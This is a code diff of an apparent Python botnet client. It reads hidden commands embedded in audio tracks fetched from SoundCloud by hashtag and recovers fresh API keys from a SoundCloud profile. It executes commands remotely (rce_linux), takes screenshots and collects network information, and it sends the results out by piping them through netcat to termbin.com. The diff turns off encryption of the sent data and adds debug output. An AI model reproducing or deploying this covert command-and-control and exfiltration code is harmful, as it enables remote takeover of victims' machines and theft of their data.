@@ -1,5 +1,5 @@
-import json
 import crypt
+import binascii
 import time
 import base64
 import re
@@ -13,7 +13,7 @@ try:
 except ImportError as e:
     system("sudo pip install -q requests")
 
-__HASHTAGS__ = "drunk storytelling"
+__HASHTAGS__ = "drunkstorytelling"
 __ENC_KEY__ = "CA7BB2E586B2297911228D570632B838D15FAD6776E28F09E0381A28854C02CA"
 __IV__ = "DADE575D41C4EDAFE55798C7B869C6E2"
 
@@ -38,11 +38,9 @@ class Bot():
 
         r = requests.get("http://api.soundcloud.com/tracks.json?client_id=" + self.apiKey + "&tags=" + __HASHTAGS__)
 
-
-        while 400 >= r.status_code <= 499:
+        while r.status_code >= 400 and r.status_code <= 499:
             #API Key has been burned, need a new one
             #Post to Termbin, wait hr, query account, If new key found, set self.apiKey. Else repeat(Done in main)
-
             user = "user-447310327-528627001/"
             r = requests.get("https://soundcloud.com/user-447310327-528627001")
             found = r.text.find(user)
@@ -55,7 +53,6 @@ class Bot():
             else:
                 self.postData['XfilData'] = "API KEY NO LONGER WORKS"
                 return None
-
 
         webjson = r.json()
         dl_array = []
@@ -71,18 +68,22 @@ class Bot():
 
         enc_command_array = []
         for song in dl_array:
+            print "[+] Song Downloaded"
             r = requests.get(song)
-            it = re.finditer('(00[2-7][0-9a-f]){8,}',r.text)
+            it = re.finditer('(00[2-7][0-9a-f]){6,}', binascii.hexlify(r.content))
 
             #Pull out every string in the .wma file
             for obj in it:
-                enc_command_array.append(obj.group(0))
+                enc_command_array.append(binascii.unhexlify(obj.group(0)))
 
+        print "[*]Done Downloading"
         #Do command validation here
         plaintext = []
-        #TODO: Remove the following lines
+        #TODO: Remove the following lines. ****Append them to plaintext!******
         for i in enc_command_array:
-            print "command: " + str(i)
+            #print "command: " + str(i)
+            plaintext.append(str(i))
+
 
         """
         for command in enc_command_array:
@@ -91,12 +92,15 @@ class Bot():
             except Exception:
                 continue
         """
+
         command_array = []
         for index in xrange(len(plaintext)):
-            if plaintext[index] == "take_screenshot" or plaintext[index] == "search_string" or \
-                plaintext[index] == "net_info" or plaintext[index] == "rce_linux" or plaintext[index] == "pull_resource":
+            plaintext[index] = plaintext[index].replace(b'\0', '')
+            if plaintext[index] == "rce_linux" or plaintext[index] == "take_screenshot" or plaintext[index] == "search_string" or plaintext[index] == "net_info" or plaintext[index] == "rce_linux" or plaintext[index] == "pull_resource":
 
                 command_array.append(plaintext[index])
+                plaintext[index+1] = plaintext[index+1].replace(b'\0', '')
+                plaintext[index+1] = plaintext[index+1].rstrip('3')
                 command_array.append(plaintext[index+1])
 
         return command_array
@@ -105,9 +109,9 @@ class Bot():
     #Post data to termbin
     def post_data(self):
         self.postData['Time'] = time.ctime()
-        encData = base64.b64encode(encrypt(str(self.postData)))
+        #encData = base64.b64encode(encrypt(str(self.postData)))
 
-        call(['echo ' + encData + ' | nc termbin.com 9999'], shell=True)
+        print check_output(['echo ' + str(self.postData) + ' | nc termbin.com 9999'], shell=True)
 
     #Take screenshot
     def take_screenshot(self):
@@ -126,7 +130,10 @@ class Bot():
     #Execute commands locally
     def rce_linux(self, command):
         self.postData['Command'] = 'rce_linux:' + command
-        self.postData['XfilData'] = check_output([command])
+        try:
+            self.postData['XfilData'] = check_output([command])
+        except OSError:
+            self.postData['XfilData'] = "Command could not be executed [Check spelling]"
 
 
     #Querry website for continuous integration
